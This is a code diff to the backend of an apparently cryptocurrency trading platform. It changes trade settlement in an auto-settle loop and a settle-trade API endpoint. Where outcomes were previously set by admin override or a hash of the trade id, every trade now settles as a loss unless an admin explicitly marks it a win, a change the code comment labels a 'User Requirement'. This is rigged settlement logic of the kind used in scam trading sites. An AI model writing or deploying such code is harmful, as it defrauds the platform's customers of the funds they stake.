@@ -197,13 +197,9 @@ const initializeDatabase = async () => {
 
         for (const trade of pendingTrades) {
           console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
-          let isWin = false;
-          if (trade.force_outcome === 'win') isWin = true;
-          else if (trade.force_outcome === 'loss') isWin = false;
-          else {
-            const seed = trade.id.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
-            isWin = seed % 2 === 0;
-          }
+          
+          // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
+          const isWin = trade.force_outcome === 'win';
 
           const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
           const amount = parseFloat(trade.amount || 0);
@@ -1097,13 +1093,8 @@ app.post('/api/settle-trade', async (req, res) => {
     const trade = tradeRes.rows[0];
     if (!trade || trade.status !== 'pending') return res.status(400).json({ error: 'Invalid trade' });
 
-    let isWin = false;
-    if (trade.force_outcome === 'win') isWin = true;
-    else if (trade.force_outcome === 'loss') isWin = false;
-    else {
-      const seed = trade.id.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
-      isWin = seed % 2 === 0;
-    }
+    // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
+    const isWin = trade.force_outcome === 'win';
 
     const finalStatus = isWin ? 'won' : 'lost';
     const leverageFactor = (parseFloat(trade.leverage) || 10) / 10;
